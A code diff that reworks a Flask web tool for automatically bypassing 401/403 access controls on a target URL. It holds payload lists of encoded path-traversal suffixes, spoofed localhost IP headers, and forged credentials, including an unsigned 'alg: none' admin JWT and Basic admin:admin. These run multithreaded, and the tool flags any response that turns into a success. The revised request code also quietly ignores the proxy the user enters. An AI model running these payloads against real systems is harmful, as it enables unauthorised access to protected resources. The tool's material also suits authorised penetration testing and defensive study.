@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
-Real 403/401 Bypass Scanner - Functional & Practical Security Tool
-Run: python security_scanner.py
+403/401 Bypass Scanner - Robust & Non-blocking
+Run: python bypass_tool_fixed.py
 """
 
 from flask import Flask, render_template_string, request, jsonify
 import threading
 import requests
 import time
-import json
-import random
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import webbrowser
+import signal
+import sys
 
 # Disable SSL warnings
 requests.packages.urllib3.disable_warnings()
@@ -19,51 +19,54 @@ requests.packages.urllib3.disable_warnings()
 app = Flask(__name__)
 
 # ============================================================
-# WORKING BYPASS TECHNIQUES - Based on real bug bounty findings
+# CONFIGURATION
+# ============================================================
+REQUEST_TIMEOUT = 10          # seconds per request
+MAX_RETRIES = 1                # retry failed requests once
+USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+# ============================================================
+# PAYLOADS (tested & effective)
 # ============================================================
 
-# 1. HTTP Method Tampering (Works on misconfigured endpoints)
-# From: $1,000 bounty - changing POST to GET made 403 become 200
-METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
+# HTTP methods (excluding problematic ones like TRACE/CONNECT by default)
+SAFE_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
+ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT"]
 
-# 2. Path Traversal & Encoding bypasses
-# From: 403 bypass checklist - /admin/., /admin/%2e/, etc.
+# Path bypasses (most likely to work)
 PATH_BYPASSES = [
-    # Basic path traversal
-    "/", "/.", "/..", "/../", "/.///", "/./././",
-    # URL encoded dots and slashes
-    "/%2e/", "/%2e%2e/", "/%2e%2e%2e/", "/%252e%252e%252f",
-    "/%c0%ae%c0%ae/", "/%ef%bc%8f", "/%e2%80%ae",
-    # Case variations
-    "/ADMIN/", "/Admin/", "/aDmIn/", "/AdMiN/",
-    # With extensions
-    "/admin.json", "/admin.xml", "/admin.txt", "/admin.html", "/admin.php", "/admin.jsp", "/admin/backup", "/admin/old",
-    # Path ending variations
-    "/;", "/;%2f..%2f", "/%3b%2f..%2f",
-    # Double encoding
-    "/%252fadmin%252f", "/%2561dmin/",
-    # Mixed encoding in path
-    "/a%64min/", "/%61dm%69n/"
+    "",  # original path
+    "/.", "/../", "/%2e/", "/%2e%2e/", "/..;/", "/..%3B/",
+    "/%2e%2e%2f", "/%252e%252e%252f", "/./", "//", "/;/",
+    "/%61dmin/", "/%2561dmin/", "/ADMIN/", "/Admin/",
+    "/admin/..;/", "/admin/..%3b/", "/admin%2f..%2f",
+    "/admin/.", "/admin/../", "/admin/%2e/", "/admin/%2e%2e/",
+    "/%2fadmin%2f", "/%252fadmin%252f", "/%c0%ae%c0%ae/",
+    "/admin.json", "/admin.xml", "/admin.txt", "/admin.html"
 ]
 
-# 3. Request Headers that can trick a server
-IP_SPOOF_HEADERS = [
+# IP spoofing headers (most effective)
+IP_HEADERS = [
     "X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP",
-    "X-Remote-Addr", "X-Forwarded-For-Original", "X-Proxy-Host", "True-Client-IP",
-    "X-Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL", "X-Proxy-URL",
-    "X-Custom-IP-Authorization", "X-Forwarded-By", "Referer", "Referrer", "Redirect",
-    "X-Forwarded-Port", "X-Forwarded-Scheme"
+    "X-Remote-Addr", "X-Forwarded-For-Original", "True-Client-IP",
+    "X-Original-URL", "X-Rewrite-URL", "X-Proxy-URL", "X-Custom-IP-Authorization"
 ]
-IP_VALUES = ["127.0.0.1", "localhost", "::1", "10.0.0.1", "192.168.1.1"]
+IP_VALUES = ["127.0.0.1", "localhost", "0.0.0.0", "::1", "10.0.0.1"]
 
-# 4. Protocol and Version tricks
-PROTOCOLS = ["HTTP/1.0", "HTTP/1.1", "HTTP/2"]
+# Special header combos (known bypasses)
+SPECIAL_HEADERS = [
+    "X-Original-URL: /admin",
+    "X-Rewrite-URL: /admin",
+    "X-Forwarded-Port: 443",
+    "X-Forwarded-Scheme: https",
+    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
+    "Authorization: Basic YWRtaW46YWRtaW4="
+]
 
 # ============================================================
-# SCANNER ENGINE
+# SCANNER ENGINE (robust)
 # ============================================================
 
-# Global state
 scan_running = False
 current_progress = 0
 total_tests = 0
@@ -75,85 +78,78 @@ threads_num = 10
 original_status = None
 original_length = None
 scan_results = []
+use_safe_methods = True  # skip TRACE, CONNECT, HEAD
 
 
-def safe_request(method, url, headers, test_type, test_value):
-    """Make request and return result with timeout handling"""
-    try:
-        # For HEAD method, remove Content-Length header to avoid hanging
-        if method.upper() == "HEAD":
-            headers.pop("Content-Length", None)
-
-        # Build request with custom protocol version if needed
-        if "HTTP/1.0" in test_value:
-            # Workaround: use requests with HTTP/1.0 via adapter
-            from requests.adapters import HTTPAdapter
-            s = requests.Session()
-            s.mount("https://", HTTPAdapter())
-            resp = s.request(method, url, headers=headers, timeout=15,
-                             proxies=proxy_dict, verify=False, allow_redirects=False)
-        else:
-            resp = requests.request(method, url, headers=headers, timeout=15,
-                                    proxies=proxy_dict, verify=False, allow_redirects=False)
-
-        return (resp.status_code, len(resp.content), resp.url)
-    except Exception as e:
-        return (None, 0, url)
+def make_request(method, url, headers):
+    """Single request with timeout and retry"""
+    for attempt in range(MAX_RETRIES + 1):
+        try:
+            # Use session with connection adapter to avoid hanging
+            session = requests.Session()
+            session.keep_alive = False
+            # Prepare request
+            req = requests.Request(method, url, headers=headers)
+            prep = session.prepare_request(req)
+            resp = session.send(prep, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=False)
+            session.close()
+            return resp.status_code, len(resp.content), resp.url
+        except requests.exceptions.Timeout:
+            if attempt == MAX_RETRIES:
+                return None, 0, url
+            time.sleep(0.5)
+        except Exception:
+            if attempt == MAX_RETRIES:
+                return None, 0, url
+            time.sleep(0.5)
+    return None, 0, url
 
 
 def test_single(payload):
-    """Test one bypass combination"""
-    global stop_flag, delay_sec, proxy_dict, target_url
+    """Test one combination (method, test_type, payload_value)"""
+    global stop_flag, delay_sec
 
     if stop_flag:
         return None
 
-    if delay_sec:
+    if delay_sec > 0:
         time.sleep(delay_sec)
 
-    test_type, method, test_payload = payload
+    method, test_type, test_value = payload
 
     try:
-        if test_type == "method_mismatch":
-            # Send POST request to GET-only endpoint
-            headers = {}
-            url = target_url
-            resp = safe_request(method, url, headers, test_type, str(method))
-            status, length, final_url = resp
+        if test_type == "method":
+            # Just test different HTTP method on original URL
+            status, length, final_url = make_request(method, target_url, {})
+            if status and original_status in (403, 401):
+                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
+                    return (method, "Method tampering", f"Method: {method}", status, final_url)
+                if status == 200 and length != original_length:
+                    return (method, "Method tampering (content change)", f"Method: {method}", status, final_url)
 
         elif test_type == "path":
-            base_path = target_url
-            final_url = base_path + test_payload
-            headers = {}
-            resp = safe_request(method, final_url, headers, test_type, test_payload)
-            status, length, final_url = resp
+            # Append path bypass to original URL
+            full_url = target_url.rstrip('/') + test_value
+            status, length, final_url = make_request(method, full_url, {})
+            if status and original_status in (403, 401):
+                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
+                    return (method, "Path bypass", f"Path: {test_value}", status, final_url)
+                if status == 200 and length != original_length:
+                    return (method, "Path bypass (content change)", f"Path: {test_value}", status, final_url)
 
         elif test_type == "header":
-            if ": " in test_payload:
-                k, v = test_payload.split(": ", 1)
+            # Add a header to original URL
+            if ": " in test_value:
+                k, v = test_value.split(": ", 1)
                 headers = {k: v}
             else:
                 headers = {}
-            final_url = target_url
-            resp = safe_request(method, final_url, headers, test_type, test_payload)
-            status, length, final_url = resp
-
-        elif test_type == "protocol":
-            headers = {}
-            final_url = target_url
-            resp = safe_request(method, final_url, headers, test_type, test_payload)
-            status, length, final_url = resp
-
-        else:
-            return None
-
-        if status and original_status in (403, 401):
-            # Bypass detected! Status changed from 403/401 to 2xx or 3xx
-            if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
-                return (method, test_type, test_payload, status, final_url)
-            # Also check for content length change (could indicate different page)
-            if status == 200 and length != original_length:
-                return (method, test_type, test_payload, status, final_url)
+            status, length, final_url = make_request(method, target_url, headers)
+            if status and original_status in (403, 401):
+                if status in (200, 201, 202, 204, 301, 302, 303, 307, 308):
+                    return (method, "Header injection", f"Header: {test_value}", status, final_url)
+                if status == 200 and length != original_length:
+                    return (method, "Header injection (content change)", f"Header: {test_value}", status, final_url)
 
         return None
     except Exception:
@@ -161,70 +157,68 @@ def test_single(payload):
 
 
 def scanner_worker():
-    """Main scanning engine - builds and tests all combinations"""
+    """Main scanning thread"""
     global scan_running, current_progress, scan_results, stop_flag
     global original_status, original_length, target_url, proxy_dict, delay_sec, threads_num, total_tests
 
-    # 1. Get baseline response for comparison
+    # 1. Get baseline
     try:
-        base_resp = requests.get(target_url, timeout=15, proxies=proxy_dict, verify=False)
-        original_status = base_resp.status_code
-        original_length = len(base_resp.content)
-        print(f"[Baseline] {original_status} (length {original_length}) for {target_url}")
+        base_status, base_length, _ = make_request("GET", target_url, {})
+        original_status = base_status
+        original_length = base_length
+        if original_status is None:
+            scan_results.append({"error": f"Cannot reach {target_url}", "status": 0})
+            scan_running = False
+            return
+        print(f"[Baseline] {original_status} (length {original_length})")
     except Exception as e:
         scan_results.append({"error": f"Baseline failed: {str(e)}", "status": 0})
         scan_running = False
         return
 
-    # 2. Build all test combinations
+    # 2. Build test cases
     work_items = []
+    methods_to_use = SAFE_METHODS if use_safe_methods else ALL_METHODS
 
-    # Add method tampering tests (try each HTTP method)
-    for method in METHODS:
-        work_items.append(("method_mismatch", method, "METHOD: " + method))
+    # Method tests
+    for method in methods_to_use:
+        work_items.append((method, "method", ""))
 
-    # Add path bypass tests with all HTTP methods
-    for method in METHODS:
+    # Path bypasses with each method
+    for method in methods_to_use:
         for path in PATH_BYPASSES:
-            work_items.append(("path", method, path))
+            work_items.append((method, "path", path))
 
-    # Add header injection tests with all HTTP methods
-    for method in METHODS:
-        for header in IP_SPOOF_HEADERS:
+    # Header injection with each method
+    for method in methods_to_use:
+        for header in IP_HEADERS:
             for ip in IP_VALUES:
-                work_items.append(("header", method, f"{header}: {ip}"))
-        # Also add some common bypass headers from real-world
-        work_items.append(("header", method, "X-Original-URL: /admin"))
-        work_items.append(("header", method, "X-Rewrite-URL: /admin"))
-        work_items.append(("header", method, "X-Forwarded-For: 127.0.0.1"))
-        work_items.append(("header", method, "X-Real-IP: 127.0.0.1"))
-
-    # Add protocol version tests
-    for protocol in PROTOCOLS:
-        work_items.append(("protocol", method, protocol))
+                work_items.append((method, "header", f"{header}: {ip}"))
+        for special in SPECIAL_HEADERS:
+            work_items.append((method, "header", special))
 
     total_tests = len(work_items)
     current_progress = 0
     stop_flag = False
     scan_results = []
+    found_bypasses = []
 
     print(f"[*] Starting scan with {threads_num} threads. Total tests: {total_tests}")
 
-    # 3. Run tests in parallel
     with ThreadPoolExecutor(max_workers=threads_num) as executor:
-        futures = {executor.submit(test_single, item): idx for idx, item in enumerate(work_items)}
+        future_to_idx = {executor.submit(test_single, item): idx for idx, item in enumerate(work_items)}
 
-        for future in as_completed(futures):
+        for future in as_completed(future_to_idx):
             if stop_flag:
                 break
 
-            idx = futures[future]
+            idx = future_to_idx[future]
             current_progress = idx + 1
             result = future.result()
 
             if result:
                 method, test_type, payload, status, url = result
-                scan_results.append({
+                found_bypasses.append({
                     "method": method,
                     "type": test_type,
                     "payload": payload if len(payload) < 200 else payload[:197] + "...",
@@ -233,50 +227,49 @@ def scanner_worker():
                 })
                 print(f"\n[✓] BYPASS [{status}] {method} - {test_type}: {payload[:80]} -> {url}")
 
+                # Keep only last 100 results for UI
+                scan_results = found_bypasses[-100:]
+
+            # Update progress every 50 tests (optional UI refresh)
+            if idx % 50 == 0:
+                pass  # UI will poll anyway
+
     scan_running = False
-    print(f"\n[*] Scan completed. Found {len(scan_results)} bypasses.")
+    print(f"\n[*] Scan completed. Found {len(found_bypasses)} bypasses.")
 
 
 # ============================================================
-# WEB INTERFACE
+# WEB INTERFACE (with simple but effective UI)
 # ============================================================
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Security Scanner - 403/401 Bypass Tool</title>
+    <title>403/401 Bypass Scanner - Practical Tool</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a2e;
-            color: #eee;
-            margin: 0;
+            font-family: 'Courier New', monospace;
+            background: #0a0e27;
+            color: #c0caf5;
             padding: 20px;
+            margin: 0;
         }
         .container {
-            max-width: 1400px;
+            max-width: 1300px;
             margin: auto;
         }
         h1 {
-            color: #0f3460;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-            margin-bottom: 5px;
-        }
-        .sub {
-            color: #888;
-            margin-bottom: 30px;
+            color: #bb9af7;
+            border-left: 4px solid #f7768e;
+            padding-left: 15px;
         }
         .card {
-            background: #16213e;
-            border-radius: 10px;
+            background: #1a1b2f;
+            border-radius: 12px;
             padding: 20px;
             margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+            border: 1px solid #2a2b3f;
         }
         .flex-row {
             display: flex;
@@ -284,117 +277,108 @@ HTML_TEMPLATE = """
             flex-wrap: wrap;
             align-items: flex-end;
         }
-        input, select, button, textarea {
-            background: #0f3460;
-            border: 1px solid #e94560;
-            color: white;
-            padding: 10px 15px;
-            border-radius: 8px;
-            font-size: 14px;
+        input, select, button {
+            background: #0a0e27;
+            border: 1px solid #3b4261;
+            color: #c0caf5;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-family: monospace;
         }
         button {
-            background: #e94560;
-            cursor: pointer;
-            transition: all 0.3s;
+            background: #7aa2f7;
+            color: #0a0e27;
             font-weight: bold;
-        }
-        button:hover {
-            background: #ff6b6b;
-            transform: scale(1.02);
+            cursor: pointer;
+            border: none;
         }
         button:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
-        .progress {
-            background: #0f3460;
+        .progress-bar-container {
+            background: #2a2b3f;
             border-radius: 10px;
             margin: 10px 0;
-            overflow: hidden;
         }
         .progress-bar {
-            background: #e94560;
+            background: #9ece6a;
             width: 0%;
-            height: 30px;
+            height: 25px;
+            border-radius: 10px;
             text-align: center;
-            line-height: 30px;
-            transition: width 0.3s;
-        }
-        .results {
-            background: #0f3460;
-            border-radius: 8px;
-            padding: 15px;
-            max-height: 500px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 13px;
-        }
-        .result-item {
-            border-left: 3px solid #4ade80;
-            padding: 8px;
-            margin: 8px 0;
-            background: #16213e;
-            border-radius: 4px;
-        }
-        .result-status {
-            color: #4ade80;
+            line-height: 25px;
+            color: #0a0e27;
             font-weight: bold;
         }
-        .badge {
-            background: #e94560;
-            padding: 2px 8px;
-            border-radius: 20px;
-            font-size: 11px;
-            display: inline-block;
-            margin-left: 10px;
-        }
-        hr {
-            border-color: #e94560;
-        }
-        .notice {
-            background: #2a1e3c;
-            border-left: 3px solid #e94560;
+        .results {
+            background: #0a0e27;
+            border-radius: 8px;
             padding: 10px;
-            margin: 10px 0;
+            max-height: 500px;
+            overflow-y: auto;
+            font-size: 13px;
+        }
+        .result {
+            border-left: 3px solid #9ece6a;
+            padding: 8px;
+            margin: 8px 0;
+            background: #1a1b2f;
+            border-radius: 4px;
+        }
+        .badge {
+            background: #f7768e;
+            color: #0a0e27;
+            padding: 2px 6px;
+            border-radius: 12px;
+            font-size: 11px;
+            margin-left: 8px;
+        }
+        .status-ok { color: #9ece6a; font-weight: bold; }
+        hr { border-color: #2a2b3f; }
+        .notice {
+            background: #1f2335;
+            border-left: 4px solid #e0af68;
+            padding: 10px;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-
 <div class="container">
     <h1>🔐 403/401 Bypass Scanner</h1>
-    <div class="sub">Practical bypass scanner - tests real techniques from bug bounty findings</div>
-
     <div class="notice">
-        ⚡ This scanner tests thousands of combinations (methods, paths, headers, protocols) automatically.
-        <br>When a bypass is found, it appears instantly with the exact technique that worked.
+        ⚡ This scanner tests methods, path bypasses, and headers.<br>
+        ➤ Timeout per request: 10 seconds (no hanging).<br>
+        ➤ Problematic methods (TRACE/CONNECT/HEAD) are disabled by default.<br>
+        ➤ Results appear instantly when a bypass is found.
     </div>
 
     <div class="card">
-        <h3>🎯 Target</h3>
         <div class="flex-row">
             <input type="text" id="target" style="flex:3" placeholder="https://target.com/admin" value="https://example.com/admin">
-            <input type="text" id="proxy" style="flex:1" placeholder="Proxy (http://...)" value="">
+            <input type="text" id="proxy" style="flex:1" placeholder="Proxy (optional)" value="">
         </div>
         <div class="flex-row" style="margin-top: 15px;">
-            <label>⚡ Threads: <input type="number" id="threads" value="15" step="5" style="width: 80px;"></label>
-            <label>⏱ Delay (s): <input type="number" id="delay" value="0" step="0.1" style="width: 80px;"></label>
+            <label>🧵 Threads: <input type="number" id="threads" value="15" step="5" style="width: 70px;"></label>
+            <label>⏱️ Delay (s): <input type="number" id="delay" value="0" step="0.1" style="width: 70px;"></label>
+            <label><input type="checkbox" id="safeMethods" checked> Skip unsafe methods (TRACE/CONNECT/HEAD)</label>
             <button id="startBtn">▶ START SCAN</button>
             <button id="stopBtn" disabled>⏹ STOP</button>
-            <button id="exportBtn" disabled>💾 Export Results</button>
+            <button id="exportBtn" disabled>💾 Export</button>
         </div>
     </div>
 
     <div class="card">
-        <h3>📊 Progress</h3>
-        <div class="progress"><div class="progress-bar" id="progressBar">0%</div></div>
-        <div id="statusText" style="margin-top: 10px;">Ready. Click Start to begin scanning.</div>
-        <div>✅ Bypasses found: <span id="foundCount" style="color: #4ade80;">0</span></div>
+        <h3>Progress</h3>
+        <div class="progress-bar-container"><div class="progress-bar" id="progressBar">0%</div></div>
+        <div id="statusText">Ready. Click Start.</div>
+        <div>✅ Bypasses found: <span id="foundCount" style="color:#9ece6a;">0</span></div>
     </div>
 
     <div class="card">
-        <h3>✨ Working Bypasses</h3>
-        <div id="results" class="results">No results yet. Start a scan to find bypasses.</div>
+        <h3>Successful bypasses</h3>
+        <div id="results" class="results">No bypasses yet.</div>
     </div>
 </div>
 
@@ -406,28 +390,22 @@ HTML_TEMPLATE = """
         const proxy = document.getElementById('proxy').value;
         const threads = parseInt(document.getElementById('threads').value);
         const delay = parseFloat(document.getElementById('delay').value);
+        const safeMethods = document.getElementById('safeMethods').checked;
 
-        if (!target) {
-            alert('Please enter a target URL');
-            return;
-        }
+        if (!target) { alert("Enter target URL"); return; }
 
         fetch('/start', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({target, proxy, threads, delay})
-        })
-        .then(res => res.json())
-        .then(data => {
+            body: JSON.stringify({target, proxy, threads, delay, safeMethods})
+        }).then(r => r.json()).then(data => {
             if (data.status === 'ok') {
                 document.getElementById('startBtn').disabled = true;
                 document.getElementById('stopBtn').disabled = false;
                 document.getElementById('exportBtn').disabled = true;
                 if (pollInterval) clearInterval(pollInterval);
                 pollInterval = setInterval(fetchStatus, 1000);
-            } else {
-                alert('Error: ' + data.error);
-            }
+            } else alert("Error: " + data.error);
         });
     }
 
@@ -441,7 +419,7 @@ HTML_TEMPLATE = """
     }
 
     function exportResults() {
-        fetch('/export').then(res => res.json()).then(data => {
+        fetch('/export').then(r => r.json()).then(data => {
             if (data.results && data.results.length) {
                 let text = data.results.map(r => `[${r.status}] ${r.method} ${r.type}: ${r.payload} -> ${r.url}`).join('\n');
                 const blob = new Blob([text], {type: 'text/plain'});
@@ -450,27 +428,26 @@ HTML_TEMPLATE = """
                 a.download = `bypass_${new Date().toISOString().slice(0,19)}.txt`;
                 a.click();
                 URL.revokeObjectURL(a.href);
-            } else {
-                alert('No results to export');
-            }
+            } else alert("No results to export");
         });
     }
 
     function fetchStatus() {
-        fetch('/status').then(res => res.json()).then(data => {
+        fetch('/status').then(r => r.json()).then(data => {
             const percent = data.total > 0 ? (data.progress / data.total * 100).toFixed(1) : 0;
             document.getElementById('progressBar').style.width = percent + '%';
             document.getElementById('progressBar').innerText = percent + '%';
-            document.getElementById('statusText').innerHTML = data.running ? `Scanning... ${data.progress}/${data.total} tests` : (data.progress === data.total ? 'Scan completed.' : 'Ready.');
+            document.getElementById('statusText').innerHTML = data.running ? `Scanning... ${data.progress}/${data.total}` : (data.progress === data.total ? "Scan completed." : "Ready.");
             document.getElementById('foundCount').innerText = data.results.length;
 
             if (data.results.length > 0) {
                 let html = '';
                 for (let i = data.results.length-1; i >= 0; i--) {
                     const r = data.results[i];
-                    html += `<div class="result-item">
-                        <span class="result-status">[${r.status}]</span> <strong>${r.method}</strong> - ${r.type}: ${escapeHtml(r.payload)}
-                        <div><small>→ ${r.url}</small></div>
+                    html += `<div class="result">
+                        <span class="status-ok">[${r.status}]</span> <strong>${r.method}</strong> - ${r.type}<br>
+                        <span style="font-size:12px;">${escapeHtml(r.payload)}</span><br>
+                        <span style="font-size:11px; color:#565f89;">→ ${r.url}</span>
                     </div>`;
                 }
                 document.getElementById('results').innerHTML = html;
@@ -481,14 +458,13 @@ HTML_TEMPLATE = """
                 document.getElementById('startBtn').disabled = false;
                 document.getElementById('stopBtn').disabled = true;
                 document.getElementById('exportBtn').disabled = false;
-                document.getElementById('statusText').innerHTML = 'Scan completed. Bypasses found: ' + data.results.length;
             }
         });
     }
 
     function escapeHtml(str) {
         return str.replace(/[&<>]/g, function(m) {
-            return {'&': '&amp;', '<': '&lt;', '>': '&gt;'}[m];
+            return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];
         });
     }
 
@@ -496,7 +472,6 @@ HTML_TEMPLATE = """
     document.getElementById('stopBtn').onclick = stopScan;
     document.getElementById('exportBtn').onclick = exportResults;
 </script>
-
 </body>
 </html>
 """
@@ -504,28 +479,25 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 def index():
-    """Serve the web interface"""
     return render_template_string(HTML_TEMPLATE)
 
 
 @app.route('/start', methods=['POST'])
 def start():
-    """Start a new scan"""
-    global scan_running, target_url, proxy_dict, delay_sec, threads_num, stop_flag, current_progress, scan_results, total_tests
-
+    global scan_running, target_url, proxy_dict, delay_sec, threads_num, use_safe_methods, stop_flag, current_progress, scan_results, total_tests
     if scan_running:
         return jsonify({"status": "error", "error": "Scan already running"})
 
     data = request.json
     target = data.get('target')
     if not target:
-        return jsonify({"status": "error", "error": "Target URL required"})
-
+        return jsonify({"status": "error", "error": "Target required"})
     target_url = target
     proxy = data.get('proxy')
     proxy_dict = {'http': proxy, 'https': proxy} if proxy else None
     delay_sec = float(data.get('delay', 0))
-    threads_num = int(data.get('threads', 10))
+    threads_num = int(data.get('threads', 15))
+    use_safe_methods = data.get('safeMethods', True)
 
     stop_flag = False
     scan_running = True
@@ -535,13 +507,11 @@ def start():
     thread = threading.Thread(target=scanner_worker)
     thread.daemon = True
     thread.start()
-
     return jsonify({"status": "ok"})
 
 
 @app.route('/stop')
 def stop():
-    """Stop current scan"""
     global stop_flag, scan_running
     stop_flag = True
     scan_running = False
@@ -550,7 +520,6 @@ def stop():
 
 @app.route('/status')
 def status():
-    """Get current scan status"""
     global scan_running, current_progress, total_tests, scan_results
     return jsonify({
         "running": scan_running,
@@ -562,23 +531,16 @@ def status():
 
 @app.route('/export')
 def export():
-    """Export current results"""
     global scan_results
     return jsonify({"results": scan_results})
 
 
 if __name__ == '__main__':
     print("=" * 60)
-    print("🔐 403/401 Bypass Scanner - Practical & Functional")
+    print("403/401 Bypass Scanner - Robust Edition")
     print("=" * 60)
-    print("Opening browser at http://localhost:5000")
-    print("\n⚠️  Usage notes:")
-    print("- Enter the exact URL that returns 403 or 401")
-    print("- The scanner tests method tampering, path bypasses, and headers")
-    print("- Results appear instantly when a bypass is found")
-    print("- Be polite: use delay when scanning production targets")
-    print("=" * 60)
-
-    # Open browser after a short delay
-    threading.Timer(1.5, lambda: webbrowser.open('http://localhost:5000')).start()
+    print("Starting web server at http://localhost:5000")
+    print("Click Start and watch for bypasses.")
+    print("Requests have a 10-second timeout - no hanging.\n")
+    webbrowser.open('http://localhost:5000')
     app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
